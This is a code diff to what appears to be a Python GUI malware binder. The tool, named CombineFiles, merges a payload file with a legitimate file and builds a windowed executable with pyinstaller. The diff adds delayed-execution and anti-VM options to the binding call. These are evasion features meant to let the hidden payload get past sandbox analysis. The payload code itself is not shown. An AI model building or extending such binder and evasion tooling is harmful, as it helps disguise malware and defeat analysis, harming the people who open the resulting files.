@@ -69,7 +69,21 @@ class CombineFiles(Gui.MainFrame):
         self.console.log(msg="-" * 30)
         choice = self.SetExtractDir()
         output_file = self.OutputFileTextCtrl.GetValue()
-        filebinder(_PAYLOADFILE, _LEGITFILE, output_file, choice,
+        if self.txtDelaySeconds.GetValue() == '':
+            delay_seconds = 0
+        else:
+            delay_seconds = int(self.txtDelaySeconds.GetValue())
+        if self.chkAntiVM.IsChecked() and self.chkDelay.IsChecked():
+            filebinder(_PAYLOADFILE, _LEGITFILE, output_file, choice,
+                       encrypt_option, delay_option="True", antivm_option="True", delay_time=delay_seconds)
+        if self.chkAntiVM.IsChecked() and not self.chkDelay.IsChecked():
+            filebinder(_PAYLOADFILE, _LEGITFILE, output_file, choice,
+                       encrypt_option, antivm_option="True")
+        if self.chkDelay.IsChecked() and not self.chkAntiVM.IsChecked():
+            filebinder(_PAYLOADFILE, _LEGITFILE, output_file, choice,
+                       encrypt_option, delay_option="True", delay_time=delay_seconds)
+        if not self.chkDelay.IsChecked() and not self.chkAntiVM.IsChecked():
+            filebinder(_PAYLOADFILE, _LEGITFILE, output_file, choice,
                         encrypt_option)
         cmd = "pyinstaller -F --windowed %s" % output_file + ".py"
         if _ICONFILE:
